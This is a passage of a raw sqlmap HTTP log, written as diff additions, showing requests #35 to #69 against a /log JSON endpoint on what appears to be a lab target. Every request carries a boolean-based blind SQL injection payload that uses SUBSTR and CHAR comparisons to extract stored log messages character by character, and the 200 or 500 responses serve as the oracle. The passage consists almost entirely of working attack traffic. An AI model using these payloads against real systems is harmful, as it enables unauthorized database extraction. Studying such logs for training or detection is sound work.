+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),10,1)>CHAR(52))||'"}
+
+HTTP response [#35] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:09 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#36]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),10,1)>CHAR(49))||'"}
+
+HTTP response [#36] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:10 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#37]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),10,1)>CHAR(50))||'"}
+
+HTTP response [#37] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:11 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#38]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),10,1)>CHAR(51))||'"}
+
+HTTP response [#38] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:11 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#39]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),11,1)>CHAR(47))||'"}
+
+HTTP response [#39] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:11 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#40]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),11,1)>CHAR(87))||'"}
+
+HTTP response [#40] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:12 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#41]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),11,1)>CHAR(107))||'"}
+
+HTTP response [#41] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:12 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#42]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),11,1)>CHAR(97))||'"}
+
+HTTP response [#42] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:13 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#43]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),11,1)>CHAR(102))||'"}
+
+HTTP response [#43] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:13 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#44]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),11,1)>CHAR(99))||'"}
+
+HTTP response [#44] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:13 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#45]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),11,1)>CHAR(98))||'"}
+
+HTTP response [#45] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:14 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#46]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),12,1)>CHAR(96))||'"}
+
+HTTP response [#46] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:14 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#47]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),12,1)>CHAR(49))||'"}
+
+HTTP response [#47] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:14 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#48]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),12,1)>CHAR(72))||'"}
+
+HTTP response [#48] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:15 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#49]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),12,1)>CHAR(60))||'"}
+
+HTTP response [#49] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:15 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#50]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),12,1)>CHAR(54))||'"}
+
+HTTP response [#50] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:15 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#51]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),12,1)>CHAR(51))||'"}
+
+HTTP response [#51] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:16 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#52]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),12,1)>CHAR(50))||'"}
+
+HTTP response [#52] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:16 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#53]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),13,1)>CHAR(47))||'"}
+
+HTTP response [#53] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:17 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#54]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),13,1)>CHAR(87))||'"}
+
+HTTP response [#54] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:17 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#55]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),13,1)>CHAR(107))||'"}
+
+HTTP response [#55] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:17 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#56]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),13,1)>CHAR(97))||'"}
+
+HTTP response [#56] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:18 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#57]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),13,1)>CHAR(102))||'"}
+
+HTTP response [#57] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:18 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#58]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),13,1)>CHAR(99))||'"}
+
+HTTP response [#58] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:19 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#59]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),13,1)>CHAR(98))||'"}
+
+HTTP response [#59] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:19 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#60]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),14,1)>CHAR(96))||'"}
+
+HTTP response [#60] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:19 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#61]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),14,1)>CHAR(49))||'"}
+
+HTTP response [#61] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:20 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#62]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),14,1)>CHAR(72))||'"}
+
+HTTP response [#62] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:20 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#63]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),14,1)>CHAR(60))||'"}
+
+HTTP response [#63] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:20 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#64]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),14,1)>CHAR(54))||'"}
+
+HTTP response [#64] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:21 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#65]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),14,1)>CHAR(51))||'"}
+
+HTTP response [#65] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:21 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#66]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),14,1)>CHAR(50))||'"}
+
+HTTP response [#66] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:21 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#67]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),15,1)>CHAR(47))||'"}
+
+HTTP response [#67] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:22 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#68]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),15,1)>CHAR(87))||'"}
+
+HTTP response [#68] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:22 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#69]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
